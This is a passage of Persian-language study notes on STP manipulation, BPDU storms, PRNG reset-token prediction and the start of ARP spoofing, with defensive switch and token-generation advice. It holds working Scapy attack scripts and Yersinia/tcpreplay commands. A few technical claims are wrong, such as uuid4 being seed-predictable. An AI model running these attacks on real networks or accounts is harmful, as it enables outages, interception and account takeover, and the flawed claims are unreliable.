	- بعضی سوئیچ‌ها حتی با یه loop فیزیکی ساده (یعنی وصل کردن دو پورت به هم با یه کابل) از کار می‌افتن، چون STP روشن نیست.
	- در واقع هنوز هم مدیرانی هستن که STP رو غیرفعال می‌کنن "چون شبکه کند میشه"!
#### Implement Attack Using Python
##### STP Attacks Using Python Scapy
###### STP Manipulation Implementation - Python Scapy(Very Simple)
```python
from scapy.all import *
import time

#Create Fake BPDU with Lower Priority of Current BPDU  (i am Root Bridge)
bpdu = Dot3(dst="01:80:c2:00:00:00") / LLC() / STP(bridge_priority=0)

#Alternative bpdu creation:
#bpdu = Dot3(dst="01:80:c2:00:00:00") / LLC() / STP(rootid=0, bridgeid=0, rootmac=get_if_hwaddr("eth0"))

while True:
    sendp(bpdu, iface="eth0", count=100, inter=0.01)
    print("BPDU Sent.")
    time.sleep(1)
```
- با این کد، در چند ثانیه همه سوئیچ‌ های همون VLAN فکر میکنن ادمین جدید دیوایس ما هست و بنابراین: 
	1. ترافیک واقعی گم میشود.
	2. بعضی از پورت ها در حالت blocking state قرار میگیرند.
	3. بعضی از پورت ها نیز در حالت forwarding قرار میگیرند.
- **در نتیجه؟**
	1. یا اینکه شبکه کامل قطع میشه (DoS) 
	2. یا ترافیک میره تو مسیرهایی که نباید بره (MITM بدون اینکه نیازی به ARP باشه).
- **اثبات حمله در سوئیچ:**
	- برای اثبات در سوئیچ سیسکو قبل و بعد از حمله دستور `show spanning-tree root` را اجرا میکنیم؛
	- **پیش از حمله:** مشاهده Priority 32768 و Mac Address اصلی
	- **بعد از حمله:** مشاهده Priority 0 و Mac Address مهاجم
###### STP Manipulation Implementation - Python Scapy(Very Simple)
- [[E10-Codes-Network Attacks Types#STP Manipulation(STP Root Bridge Hijacking) - Simple Version]]
###### BPDU Storm  Implementation - Python Scapy(Very Simple)
تکه کد زیر ارسال سیل‌آسای TCN BPDU برای ایجاد Reconvergence مداوم را انجام میدهد. تاثیر آن DoS با قطعی‌ های ۵۰ ثانیه‌ای مکرر است.
```python
from scapy.all import *

# حمله: طوفان TCN BPDU (تغییر توپولوژی جعلی)
bpdu = Dot3(dst="01:80:c2:00:00:00") / LLC() / STP(bpdutype=0x80)  # TCN = 0x80

while True:
    sendp(bpdu, iface="eth0", count=100, inter=0.01, verbose=0)  # سیل
```

- **اثبات:**
	- برای اثبات باید در سویچ سیسکو کامندهای زیر را اجرا کنیم و خروجی آنها را بررسی کنیم.
	1. `show spanning-tree vlan 1 detail | include topology changes`
		- با اجرای حمله topology changes باید سریعاً افزایش یابد!
	2. `show processes cpu sorted | include STP`
		- مصرف CPU اسپایک می‌کند - یعنی نزدیک 100 درصد است.
```python
#Run below command in Cisco Switch:
show spanning-tree vlan 1 detail | include topology changes
#با اجرای حمله topology changes باید سریعاً افزایش یابد!

show processes cpu sorted | include STP
#مصرف CPU اسپایک می‌کند - یعنی نزدیک 100 درصد است.
```
##### Implement STP Attacks Using Kali Linux
###### Implement STP Attacks - Yersinia Kali Linux(GUI Mode)
ساده ترین راه پیاده سازی حملات STP در کالی لینوکس استفاده از Yersinia در Kali Linux است:
```sh
#Install Yersinia
sudo apt install yersinia
#Run in GUI Mode
sudo yersinia -G
#After Open Yersinia goto STP Tab
```
1. برای **STP Manipulation(Root Hijack):**
	1. روی "Claiming Root Role" کلیک کنید و سپس Launch
2. برای **BPDU Storm:**
	1. روی "Sending conf BPDU" کلیک کنید و سپس Launch (تعداد بالا)
###### Implement STP Attacks - Yersinia Kali Linux(CMD Mode)
در Yersinia برای حملات STP سه نوع حمله مختلف را میتوانیم Launch کنیم که برای مشخص کردن نوع حمله باید عدد مشخص آنرا در مقابل آرگومان `attack-` بنویسیم.
- `sudo yersinia stp -attack [attack-number]`
	1. `-attack 1` Claiming Root Role (STP Manipulation - Root Hijack)
	2. `-attack 2` Claiming Other Role (Backup Root)
	3. `-attack 3` Sending conf BPDU (BPDU Storm - Flooding)
```sh
#STP Manipulation(Root Hijacking) Attack
sudo yersinia stp -attack 1 -interface eth0

#BPDU Storm (DoS) Attack
sudo yersinia stp -attack 3 -interface eth0

#انواع حملات STP در Yersinia:
#-attack 0: N/A
#-attack 1: Claiming Root Role (Root Hijack)
#-attack 2: Claiming Other Role (Backup Root)
#-attack 3: Sending conf BPDU (Flooding)
```
###### Implement STP Attacks - tcpreplay, scapy Kali Linux
0. **Description:**
	1. برای پیاده سازی حملات STP با `tcpreplay` باید یک بسته PCAP را با Wireshark ذخیره کنیم و سپس آنرا پخش با tcpreplay پخش کنیم(روش دو مرحله‌ای)
1. **Step 1: Capture BPDU using Wireshark and Change Priority:**
	1. وایرشارک را بر روی پورتی که به سوئیچ متصل است Run میکنیم.
	2. روی لینک ترانک سوییچ، یک Configuration BPDU واقعی با Wireshark ذخیره میکنیم. 
	3. سپس با Scapy مقدار Priority را دستکاری میکنیم:
```python
from scapy.all import *

#Load BPDU PCAP 
pkts = rdpcap("real_bpdu.pcap")

#Change Priority to 0
for p in pkts:
    p[STP].rootid = 0
    p[STP].bridgeid = 0

#Write Priority changed PCAP
wrpcap("evil_bpdu.pcap", pkts)
```
2. **Step 2: Broadcast Packet Using `tcpreplay`:**
	1. حال با استفاده از بسته ای که آنرا تغییر دادیم میتوانیم هر دو حمله BPDU Storm و STP Manipulation را پیاده سازی کنیم.
```sh
#Root Hijack Attack: Every 2 Second
sudo tcpreplay --loop=0 --pps=0.5 -i eth0 evil_bpdu.pcap

#BPDU Storm Attack: 1000 Packet in a Second
sudo tcpreplay --loop=0 --pps=1000 -i eth0 evil_bpdu.pcap
```
###### Implement STP Attacks - stp-flood Kali Linux
ابزار `stp-flood` یک اسکریپت پایتون تخصصی برای پیاده سازی انواع حملات در پروتکل STP است.
```sh
#Install from GitHub
git clone https://github.com/audibleblink/stp-flood.git
cd stp-flood
pip install -r requirements.txt

#BPDU Storm Attack
sudo python stp-flood.py eth0

#STP Manipulation(Root Hijack) Attack
sudo python stp-flood.py -r eth0
```

##### General Python Script - All STP Attacks
1. **Description:**
	* با استفاده از اسکریپت پایتونی زیر میتوانیم حملات زیر را پیاده سازی کنیم:
	1. STP Manipulation(Root Hijacking)
	2. BPDU Storm 
	3. Chaos Mode(Root Hijacking + BPDU Storm )
```python
#!/usr/bin/env python3

from scapy.all import *
import sys

attack = sys.argv[1] if len(sys.argv) > 1 else "root"
iface = sys.argv[2] if len(sys.argv) > 2 else "eth0"

if attack == "root":
    #Attack 1: Root Bridge Hijacking
    pkt = Dot3(dst="01:80:c2:00:00:00") / LLC() / STP(rootid=0, bridgeid=0)
    sendp(pkt, iface=iface, loop=1, inter=2, verbose=0)
    
elif attack == "storm":
    #Attack 2: BPDU Flooding
    pkt = Dot3(dst="01:80:c2:00:00:00") / LLC() / STP(bpdutype=0x80)
    sendp(pkt, iface=iface, loop=1, count=100, inter=0.01, verbose=0)

elif attack == "chaos":
    #Attack 3: Root + Storm (نهایت خرابکاری)
    def chaos():
        while True:
            pkt = Dot3(dst="01:80:c2:00:00:00") / LLC() / STP(rootid=0, bridgeid=0, bpdutype=0x80)
            sendp(pkt, iface=iface, count=50, inter=0.05, verbose=0)
            time.sleep(0.5)
    chaos()

else:
    print("Usage: python3 stp_attack.py [root|storm|chaos] [iface]")
```
2. **Running Methods:**
```python
sudo python3 stp_attack.py root eth0    #STP Manipulation(Root Hijack)
sudo python3 stp_attack.py storm eth0   #BPDU Storm
sudo python3 stp_attack.py chaos eth0   #Chaos Mode(Root Hijacking + BPDU Storm at same time)
```
#### Security Solutions
##### Normal Solution Against STP Attacks
1. **Close `PortFase` on Access Port:**
	1. اولین روش برای دفاع موثر در مقابل STP Manipulation بستن `PortFase` در روی پورت های Access Port است:
	2. **روش انجام:**
		1. `interface Gi0/5`
		2. `spanning-tree portfast`
2. **Enable BPDU Guard in Access Port:**
	1. فعال کردن BPDU Guard روی پورت های Access Port (پورت‌هایی که نباید سوئیچ بهشون وصل بشه). 
	2. این قابلیت میگوید اگر در این پورت بسته BPDU دیدی، بی‌چون و چرا پورت را Shutdown کن.
	3. **روش انجام:**
		1. `interface Gi0/5`
		2. `spanning-tree bpduguard enable`
3. **Enable Root Guard:**
	1. فعال کردن قابلیت Root Guard برای پورت‌ هایی که نباید Root Bridge جدید بشوند. 
	2. در این روش اگر BPDU با Priority بهتر رسید، توسط سوئیچ بلک میشود.
	3. **روش اجرا:**
		1. `interface Gi0/5`
		2. `spanning-tree guard root`
4. **Using Rate Limits for BPDU:**
	1. روش دیگر مشخص کردن Rate Limit(محدود کردن) تعداد پیام های BPDU است.
```sh
#Limit BPDU in a Second
Switch(config)$ errdisable detect cause bpduguard
Switch(config)$ errdisable recovery cause bpduguard
Switch(config)$ errdisable recovery interval 300  #Recover after 300 Seconds(5 Minutes)

#Limit BPDU on an Interface
Switch(config-if)$ storm-control broadcast level 50
Switch(config-if)$ storm-control multicast level 50
```
5. **Using BPDU Filtering:**
	1. با استفاده از این ویژگی مشخص میکنیم کدام پورت ها مجاز به ارسال/دریافت BPDU هستند.
	2. `interface Gi0/5` Select Interface
	3. `spanning-tree bpdufilter enable` Enable BPDU Filter for this Interface
6. **Using Loop Guard:**
	1. این ویژگی میگوید اگر BPDU قطع شد، پورت را Loop-inconsistent کن.
	2. `interface Gi0/5`
	3. `spanning-tree guard loop`
7. **Using UDLD:**
	1. از UDLD برای تشخیص لینک یک‌طرفه استفاده میشود.
	2. `udld enable`
	3. `interface Gi0/5`
	4. `udld port aggressive`
8. **Access Port Suitable Configuration(Cisco Best Practice):**
	1. از دیگر روش های امنیتی تنظیم بهینه Access Port برای جلوگیری از حملات STP است:
```sh Cisco
interface GigabitEthernet0/1
 description *** USER ACCESS PORT ***
 switchport mode access
 switchport access vlan 10
 
 #Enable Immediate Forwarding
 spanning-tree portfast         
 #if BPDU Received == Port Disconnecting
 spanning-tree bpduguard enable 
 #if BPDU with Priority Received == Port Disconnecting is Better
 spanning-tree guard root       
```
- **All Cisco Commands to Defense Against Root Hijacking:**
```sh Cisco
#1-Root Guard: if BPDU with Lower Priority Received Block this Port
Switch(config-if)$ spanning-tree guard root

#2-BPDU Guard: if BPDU on Access Port Received Set 'Err-disable' on this Port
Switch(config-if)$ spanning-tree bpduguard enable

#3-BPDU Filter: Disable Send/Receive BPDU for this Port
Switch(config-if)$ spanning-tree bpdufilter enable

#4-Loop Guard: if BPDU Disconnect set 'Loop-inconsistent' on this Port
Switch(config-if)$ spanning-tree guard loop

#5-UDLD: Detect one way Link
Switch(config)$ udld enable
Switch(config-if)$ udld port aggressive
```
##### Use STP Alternatives
###### Description
1. **Use STP Alternatives(RSTP, MSTP):**
	1. استفاده از STP های امن تر مانند RSTP یا MSTP که کمی بهترن، ولی بازم بی‌دفاع نیستن. 
	2. نکته اینجاست که این پروتکل ها هنوز از هسته STP استفاده میکن و فقط در بعضی ویژگی ها مثله زمان قطعی بسیار کمتر و پشتیبانی از چند Root Bridge همزمان پشتیبانی میکنند.
2. **RSTP(Rapid Spanning Tree Protocol) - IEEE 802.1w Standard:**
	1. **ویژگی های RSTP:**
		1. وجود Proposal/Agreement: به جای Timer، مذاکره مستقیم بین سوییچ‌ها
		2. همه سوییچ‌ها BPDU می‌فرستند (نه فقط Root).
		3. وجود Edge Port (مشابه Port Fast): بسته ها فوراً Forwarding می‌شود.
		4. وجود Link Type: پورت‌های Point-to-Point سریعتر مذاکره می‌کنند.
	2. **پس از فعال سازی - چرا هنوز هم امن نیست؟:**
		1. هنوز BPDU دارد، بنابراین Root Hijacking ممکن است.
		2. ویژگی BPDU Guard همچنان ضروری است.
		3. اعمال BPDU Filtering روی Edge Port ها توصیه می‌شود.
3. **MSTP(Multiple Spanning Tree Protocol) - IEEE 802.1s Standard:**
	1. **مفهوم اصلی:**
		1. به جای یک درخت STP برای همه VLAN ها یا یک درخت برای هر VLAN (PVST+)، چندین VLAN را در یک Instance* گروه‌بندی می‌کند.
	2. **مزایا:**
		1. مقیاس‌پذیری: به جای 50 Instance برای 50 VLAN از تعداد کمتری Instance استفاده میشود، مثلاً 3 Instance(پهنای باند با سرعت بیشتر)
		2. وجود Load Balancing: 
			1. تمام VLAN زوج از مسیر A
		    2. تمام VLAN فرد از مسیر B
		    3. در نتیجه افزایش سرعت و پهنای باند شبکه
		3. سازگاری با RSTP: داخل هر Instance از مکانیزم RSTP استفاده می‌کند.
4. **TRILL & SPB:**
	1. هر دو پروتکل، جایگزین STP هستند و کلاً مفهوم Root Bridge و BPDU را حذف می‌کنند.
5. **TRILL(Transparent Interconnection of Lots of Links)- IETF Standard:**
	1. **مشکل STP که TRILL حل می‌کند:**
		1. پروتکل STP لینک‌ های اضافی را Block می‌کند در نتیجه با هدر رفت پهنای باند مواجه میشویم(سرعت شبکه پایین می آید)
		2. ویژگی Root Bridge نقطه شکست واحد است.(ناپایداری در شبکه)
		3. پیام های BPDU دستکاری می‌شود.(امنیت پایین)
	2. **پروتکل TRILL چطور کار می‌کند:**
		1. از ویژگی `IS-IS` که پروتکل مسیریابی لایه 3 شبکه است، در لایه 2 استفاده می‌کند.
		2. همه لینک‌ ها فعال هستند (ECMP - Multipath).
		3. خبری از Root Bridge و BPDU نیست در نتیجه حملات STP بی معنا می‌شوند.
		4. استفاده از `RBridge` (Routing Bridge) به جای سوییچ سنتی.
6. **SPB(Shortest Path Bridging) - IEEE 802.1aq Standard**
	1. پروتکل SPB هم از IS-IS(پروتکل مسیریابی در لایه 3) برای محاسبه کوتاه ترین مسیر استفاده می‌کند.
	2. **پروتکل SPB در دو حالت کار میکند:**
		1. **SPBV (VLAN):** 
			1. برای هر VLAN درخت جدا.
	    2. **SPBM (MAC-in-MAC):** 
		    1. تعبیه backbone شفاف برای مشتری.
	3. **ویژگی های SPB:**
		1. استفاده از IS-IS(پروتکل مسیریابی در لایه 3) در لایه 2 شبکه
		2. همه لینک‌ها فعال، بدون حلقه (Loop-free by design).
		3. پیام های BPDU وجود ندارد و  در نتیجه حملات STP بی‌ اثر هستند.
###### Implement RSTP
1. **RSTP:**
	- برای پیاده سازی این ویژگی از دو روش میتوانیم استفاده کنیم.
	1. فعال کردن مستقیم `rapid-pvst` که RSTP است.
	2. فعال کردن پروتکل MSTP در حالت One Instance Mode که عملا استفاده از MSTP با امکانات RSTP است.
	3. 
```sh Cisco
#Enable RSTP(rapid-pvst for each VLAN)

Switch(config)$ spanning-tree mode rapid-pvst

#One Instance Mode (MST with 1 Instance - Actually RSTP)
Switch(config)$ spanning-tree mode mst
Switch(config)$ spanning-tree mst configuration
Switch(config-mst)$ name REGION1
Switch(config-mst)$ revision 1

#Config Edge Port For Access Ports
Switch(config)$ interface range gi0/1-24
Switch(config-if)$ spanning-tree portfast
Switch(config-if)$ spanning-tree bpduguard enable
```
###### Implement MSTP
2. **MSTP:**
```sh Cisco
#Enable MST
Switch(config)$ spanning-tree mode mst

#Configure Region & Instance Mapping
Switch(config)$ spanning-tree mst configuration
Switch(config-mst)$ name MY-REGION
Switch(config-mst)$ revision 10

#Instance 1: for VLAN 10,20,30
Switch(config-mst)$ instance 1 vlan 10, 20, 30
#Instance 2: for VLAN 40,50,60
Switch(config-mst)$ instance 2 vlan 40, 50, 60

Switch(config-mst)$ exit

#Set Priority for Load Balancing
#Switch A: Root for Instance 1
Switch-A(config)$ spanning-tree mst 1 root primary
Switch-A(config)$ spanning-tree mst 2 root secondary

#Switch B B: Root for Instance 2
Switch-B(config)$ spanning-tree mst 1 root secondary
Switch-B(config)$ spanning-tree mst 2 root primary

#Apply BPDU Guard on Access Ports
Switch(config)$ interface range gi0/1-48
Switch(config-if)$ spanning-tree bpduguard enable
```
###### Implement TRILL & SPB
2. **TRILL & SPB:**
	1. نکته: پروتکل های TRILL و SPB در سوئیچ های جدید Cisco قابل استفاده هستند.
```sh Cisco
#TRILL => Cisco Nexus
feature fabricpath
fabricpath domain default

#SPB => Cisco Juniper
set protocols fabric
```

#### Summary Tables
##### All STP Attacks Comparing + Defense Methods

| حمله               | STP سنتی    | RSTP       | MSTP       | دفاع مؤثر               |
| ------------------ | ----------- | ---------- | ---------- | ----------------------- |
| **Root Hijacking** | آسیب‌پذیر   | آسیب‌پذیر  | آسیب‌پذیر  | Root Guard              |
| **BPDU Storm**     | DoS کامل    | DoS سریعتر | DoS سریعتر | BPDU Guard + Rate Limit |
| **TCN Flood**      | همگرایی ۵۰ث | همگرایی ۱ث | همگرایی ۱ث | BPDU Filter روی Edge    |
| **MITM via Root**  | ممکن        | ممکن       | ممکن       | Root Guard + MACSec     |
##### Differs Between STP & STP Alternatives

| ویژگی             | STP (802.1D)                                                 | RSTP (802.1w)                             |
| ----------------- | ------------------------------------------------------------ | ----------------------------------------- |
| **حالت‌های پورت** | ۵ حالت (Blocking, Listening, Learning, Forwarding, Disabled) | ۳ حالت (Discarding, Learning, Forwarding) |
| **همگرایی**       | ۳۰-۵۰ ثانیه                                                  | زیر ۱ ثانیه                               |
| **BPDU**          | فقط Root ارسال می‌کند                                        | همه سوییچ‌ها هر ۲ ثانیه ارسال می‌کنند     |
| **Backup Port**   | ندارد                                                        | دارد (مسیر جایگزین آماده)                 |
| **تشخیص خرابی**   | Max Age Timer (۲۰ ثانیه)                                     | ۳ Hello از دست رفته (۶ ثانیه)             |
### PRNG Reset Attack(Pseudorandom Token Prediction)
#### Description
##### Random Functions & Attack Description
1. **`Math.random()`(Java Script) | `random()`(Python) Actually Random?**
	1. آیا الگوریتم های `random()` در پایتون و یا `Math.random()` در جاوااسکریپت واقعاً رندوم هستن؟
	2. خیر اصلا! اینها Pseudorandom هستند؛ یعنی اگه مقدار اولیه (Seed) رو بفهمیم، میتونیم کل قطار Token هایی که تا صد سال بعد تولید میشن را پیش‌بینی کنیم.
2. **`Math.random()`(Java Script) | `random()`(Python) Description:**
	1. خیلی از سیستم‌ها برای «بازیابی رمز عبور» یا «تأیید ایمیل» از توکن‌ هایی که به ظاهر تصادفی هستند استفاده میکنند.
	2. در واقع اگر که از متدهای random() پیشفرض زبان ها استفاده شود ضعف امنیتی بحساب میاد چون براحتی میشه توکن های بعدی رو حدس زد.
	3. یعنی وقتیکه مقدار اولیه یا همان Seed رو بفهمیم، میتونیم توکن بعدی رو حدس بزنیم.
3. **Where is Seed?**
	1. کتابخانه های Random در تمامی زبان های مشهور وب مانند PHP, JS, Python دارای متدی بنام `seed` هستند که مقدار Seed را دریافت و مشخص میکند.
	2. مثلا در پایتون Seed بوسیله `random.seed(seed)` دریافت میشود.
	3. **نکته:** مقدار Seed اصولا و در اکثر موارد برابر زمان فعلی سیستم است(`time.time()`) 
	4. این موضوع به این دلیل است که مقدار Seed برای هر محاسبه باید متفاوت باشد و این تابع نیز هر بار مقدار seed متفاوتی را تولید میکند.
4. **Real Scenario: Get Password of Account Using Reset Password Links**
	1. در واقعیت میتونم لینک بازیابی رمز یک اکانت(که رمز جدید درونش هست) رو قبل از اینکه به ایمیل شخص برسه برداریم و پسورد رو عوض کنم.
	2. به این نوع از حملات PRNG Reset Attack یا Pseudorandom Token Prediction گفته میشود.
5. **PRNG Reset Attack(Pseudorandom Token Prediction) Steps:**
	1. مهاجم حساب خودش را میسازد و چندین بار درخواست "بازیابی رمز عبور" می‌دهد.  
	2. توکن‌های دریافتی را تحلیل می‌کند و **Seed(مقدار اولیه)** تولید کننده اعداد تصادفی (مثلاً `time()` میلی‌ ثانیه) را مهندسی معکوس می‌کند.  
	3. حالا میتواند توکن بعدی قربانی را پیش‌بینی کند.
	4. سپس قبل از قربانی، لینک بازیابی را می‌زند و رمز را عوض می‌کند.
##### Notes
1. **Note 1: Which Machines/Systems Using this Methods?**
	1. این سیستم تولید توکی Random بوسیله توابع پیشفرض زبان در سیستم ها و ماشین های زیر استفاده میشه:
		1. سیستم‌های کوچک
		2. اکثر پلاگین‌های وردپرسی
		3. بعضی API های به اصطلاح بزرگ که عجله دارن و حتی از `uuid.uuid4()` هم استفاده نمیکنن (که اونم اگه Seed رو بفهمی قابل پیش‌بینی میشه). 
		4. بنابراین بله، سیستم uuid4() هم بر پایه Random هست و بنابراین قابل پیش بینی است.
2. **Note 2: MD5(Username + Timestamp):**
	1. بعضی سیستم‌ها از MD5(username + timestamp) استفاده میکنند.
	2. بنابراین کافیه Timestamp رو بفهمیم، در نتیجه میتونیم به سیستم نفوذ کنیم.
	3. در واقع اصلاً نیازی به کد خاصی نیست، فقط کافیه متوجه بشیم توی کدوم دقیقه و ثانیه درخواست صادر شده است.
#### Implement Attack Using Python
##### Very Simple Method
- میخواهیم یک سناریو واقعی را با پایتون بررسی کنیم. 
1. فرض کنید وبسایتی از کد زیر برای ساختن توکن استفاده میکند:
```python
import random
import time

def generate_reset_token(user_id):
    random.seed(time.time())      #مقدار Seed برابر ثانیه فعله
    return random.randint(100000, 999999)
```
2. الان ما که یک حساب کاربری در وبسایت مورد نظر داریم، به وبسایت مراجعه میکنیم و درخواست بازیابی رمز میدیم. سپس یک توکن ۶ رقمی به ایمیل مون میرسه. حالا کافیه `time.time()` رو برای همون ثانیه ای که توکن ایجاد شده را با استفاده از یک Loop تخمین بزنیم(مثلاً با مقایسه سرور و زمان خودم):
```python
import random
import time

#Token received in Email: 456123
my_token = 456123
guessed_seed = None

for i in range(-10, 10):  #Differs 10 Second After/Before Token Received
    test_seed = int(time.time()) + i
    random.seed(test_seed)
    if random.randint(100000, 999999) == my_token:
        guessed_seed = test_seed
        break

#Now we can guess TOKEN of another user
random.seed(guessed_seed)
next_token = random.randint(100000, 999999)
print(f"توکن بعدی کاربر: {next_token}")
```
- با اینکار میتونیم تا 10 ثانیه بعد، توکن بازیابی هر کاربر دیگری رو پیش بینی کنیم. فقط کافیه که Username اونرو بلد باشیم و لینک بازیابی را بسازیم. به همین راحتی
- **لینک بازیابی رمز عبور:**
	1. میشه که در وبسایت مورد نظر برای Username که میخواهیم توکنش رو محاسبه کنیم درخواست Reset پسورد را بزنیم و لینک رو از اونجا برداریم.
	2. **روش بهتر:** فرمت لینک های بازیابی رمز عبور در یک وبسایت برای تمای یوزرنیم ها یکسان است. بنابراین با رعایت فرمت لینک بازیابی رمز عبور که دریافت کردیم، برای Username جدید یک لینک بازیابی جدید میسازیم.
##### Advance Method
- [[E10-Codes-Network Attacks Types#PRNG Reset Attack(Pseudorandom Token Prediction)]]
#### Security Solutions
##### Methods for Against PRNG Reset Attack(Pseudorandom Token Prediction)
1. **Using `secrets` Instead of `random`:**
	1. برای دفاع در مقابل این آسیب پذیری کتابخانه `secrets` بهترین روش است.
```python
#❌ غلط - قابل پیش‌بینی
import random
token = random.randint(100000, 999999)

#✅ Secure Way
import secrets
token = secrets.token_hex(32)  #توکن ۶۴ کاراکتری هگز
#Or
token = secrets.token_urlsafe(32)  #توکن URL-safe
#یا برای عدد ۶ رقمی
token = secrets.randbelow(900000) + 100000
```
2. **Using `os.urandom()`:**
	1. استفاده از `urandom()` درون کتابخانه `os` نیز یکی دیگر از روش های ایمن برای دفاع در مقابل این حمله است.
```python
import os
token = os.urandom(32).hex()  #64 کاراکتر هگز
```
3. **Ever Never Use `time` for Seed:**
	1. هرگز و هرگز از `time` برای Seed استفاده نکنید.
```python
#❌ غلط
random.seed(int(time.time()))
#❌ باز هم غلط
random.seed(time.time_ns())  #نانوثانیه هم brute force می‌شود!
```
4. **Using Rate Limiting:**
	1. ایجاد محدودیت در Rate Limit و اعتبار زمانی
	2. مثلا روش زیر را با استفاده از Redis Database میتوانیم پیاده سازی کنیم.
```python
#محدود کردن تعداد درخواست بازیابی در هر آیپی
#(با Redis/Database پیاده‌سازی می‌شود)
RATE_LIMIT = 3  #حداکثر 3 درخواست در 15 دقیقه
RATE_WINDOW = 900  #ثانیه

#اعتبار محدود توکن
TOKEN_EXPIRY = 300  #5 دقیقه
```
5. **Add Salt to Token:**
	1. ویژگی Salt مقداریست که به توکن اضافه میشود تا هر بار عبارت جدیدی نیز به Random تولید شده اضافه شود.
	2. با اینکار اگر Seed را داشته باشیم نیز پیش بینی کردن توکن امکان پذیر نیست.
```python
import secrets
import hashlib

def generate_secure_token(email):
    salt = secrets.token_hex(16)
    random_part = secrets.token_hex(32)
    token = hashlib.sha256(f"{salt}{email}{random_part}".encode()).hexdigest()
    return token
```
##### Secure Code for Token Generation
تکه کد زیر ورژن امن برای تولید توکن است.
```python
#!/usr/bin/env python3
"""نسخه امن - همین حمله جواب نمی‌دهد"""

import secrets

class SecureServer:
    def generate_reset_token(self, user_email):
        #با secrets، هیچ Seed ای برای کشف وجود ندارد
        token = secrets.randbelow(900000) + 100000
        #یا بهتر:
        #token = secrets.token_urlsafe(32)
        return token


#تست: حمله را روی نسخه امن امتحان کنید
secure = SecureServer()
tokens = [secure.generate_reset_token("test@test.com") for _ in range(10)]

print("توکن‌های تولید شده با secrets:")
for i, t in enumerate(tokens):
    print(f"  {i+1}: {t}")

print("\n❌ هیچ الگویی قابل پیش‌بینی نیست!")
print("✅ مهاجم نمی‌تواند Seed را کشف کند چون اصلاً Seed وجود ندارد!")
```
### ARP Spoofing(ARP Cache Poisoning)
#### Description
##### Introduction: ARP Description
1. **What is ARP(Address Resolution Protocol)?**
	1. پروتکل ARP برای ترجمه یکطرفه IP به MAC استفاده میشه. 
	2. در واقع پروتکل ARP میپرسد؛ "این IP چه MAC ای دارد؟"
2. **ARP Families:**
	1. **RARP(Reverse ARP):**
		1. برای ترجمه MAC به IP از پروتکل RARP استفاده میشود.
		2. در شبکه های مدرن برای تبدیل MAC به IP از DHCP استفاده میشود.
		3. در بسیاری از منابع عمومی و غیر تخصصی به اشتباه ARP را پروتکلی برای ترجمه دو طرفه IP به MAC و بالعکس معرفی میکنند.
	2. **inARP:**
		1. پروتکل inARP برای ترجمع DLCI به IP استفاده میشود.
		2. در واقع پروتکلی منسوخ شده برای پیدا کردن IP در Frame Replay است.
	3. **Note:**
		1. وقتی یک دستگاه ARP Reply دریافت می‌کند، خودش آن را(IP, MAC) در کش ARP ذخیره می‌کند، یعنی نتیجه کار ARP یک نگاشت دوطرفه در حافظه ایجاد می‌کند:
			1. `IP ← MAC`
		2. اما خود پروتکل فقط یک سوال می‌پرسد: "این IP چه MAC ای دارد؟"
3. **How ARP Works?**
	1. پروتکل ARP (Address Resolution Protocol) مثل یک دفترچه تلفن در شبکه محلی عمل می‌کند.
	2. پروتکل ARP با دو بسته اساسی ARP Request - Broadcast و ARP Reply - Unicast کار میکند. همچنین جدولی بنام ARP Cache هم وجود دارد که IP - MAC دستگاه های شبکه را درخود ذخیره میکند. این جدول بار کاری ARP را کاهش میدهد.
	3. **روش کاری ARP:**
		1. پرسش: "کدام دستگاه آیپی 192.168.1.1 رو داره؟" (ARP Request - Broadcast)
		2. پاسخ: "من! با MAC آدرس `aa:bb:cc:dd:ee:ff` صاحب آیپی هستم" (ARP Reply - Unicast)
4. **Security Problems in ARP:** 
	1. پروتکل ARP **هیچ مکانیزم احراز هویت** ندارد! 
	2. هر دستگاهی می‌تواند ادعا کند که یک IP خاص متعلق به اوست. 
	3. این اعتماد کورکورانه، اساس حمله ARP Spoofing است.
5. **What is Gratuitous ARP?**
	1. بعضی مواقع پیش می آید که ماشین هیچ ARP Request ای ارسال نکرده است اما ARP Replay دریافت میکند.
	2. به این حالت که ARP Replay های ناخواسته دریافت میشود، Gratuitous ARP گفته میشود.
##### ARP Spoofing(ARP Cache Poisoning) Description
1. **What is ARP Spoofing(ARP Cache Poisoning) Attack?**
	1. حمله ARP Spoofing (یا ARP Cache Poisoning) یک حمله لایه 2 (Data Link) است.
	2. در این حمله مهاجم با ارسال بسته‌های جعلی ARP Reply، جدول ARP قربانی را مسموم می‌کند و ترافیک شبکه را به سمت خود منحرف می‌نماید.(MITM)
2. **ARP Spoofing(ARP Cache Poisoning) Mechanism:**
	1. **سناریو حمله:**
		1. قربانی (Victim): آیپی(192.168.1.10) - مک(00:11:22:33:44:55)
		2. گیت‌وی (Gateway): آیپی(192.168.1.1) - مک(aa:bb:cc:dd:ee:ff)
		3. مهاجم (Attacker): آیپی(192.168.1.99) - مک(66:77:88:99:aa:bb)
	2. **گام‌های حمله:**
		1. **مهاجم به قربانی می‌گوید: "من گیت‌وی هستم!" - ARP جعلی با آیپی Gateway ، مک مهاجم** 
			1. بسته ARP Reply جعلی: با آیپی 192.168.1.1(Gateway IP) متعلق به مک 66:77:88:99:aa:bb(مک مهاجم) است.
			2. قربانی این را در حافظه ARP خود ذخیره می‌کند.
		2. **مهاجم به گیت‌ وی می‌گوید: "من قربانی هستم!" - ARP جعلی با آیپی قربانی ، مک مهاجم**
			1. بسته ARP Reply جعلی: آیپی 192.168.1.10(Victim IP) متعلق به مک 66:77:88:99:aa:bb (مک مهاجم) است.
			2. گیت‌ وی این را در حافظه ARP خود ذخیره می‌کند.
		3. **نتیجه: تمام ترافیک بین قربانی و گیت‌وی از مهاجم عبور می‌کند:**
			1. `Victim ←→ Attacker ←→ Gateway ←→ Internet`
		4. **چرا اینکار را میکند؟**
			1. پروتکل ARP هیچ درخواستی را تأیید نمی‌کند. 
			2. دستگاه‌ ها هر ARP Reply که برسد را قبول می‌کنند و کش خود را بروز می‌کنند، حتی اگر درخواستی نداده باشند! (به این Gratuitous ARP می‌گویند)
3. **Golden Note:**
	1. پروتکل ARP پروتکلی بدون حافظه و بدون احراز هویت است. 
	2. هر کسی(MAC آدرس) می‌تواند ادعا کند هر IP ای متعلق به اوست. 
	3. این ذات آسیب‌ پذیر ARP است، نه یک باگ.
#### Implement ARP Spoofing(ARP Cache Poisoning) Attack
##### Using Python Scapy
###### Method 1: Simple
- **Codes:**
```python
from scapy.all import ARP, send, Ether, srp
import time
import sys

def get_mac(target_ip):
    #مک آدرس رو از روی آیپی پیدا می‌کنه
    #Find MAC Address from IP Address
    arp_request = ARP(pdst=target_ip)
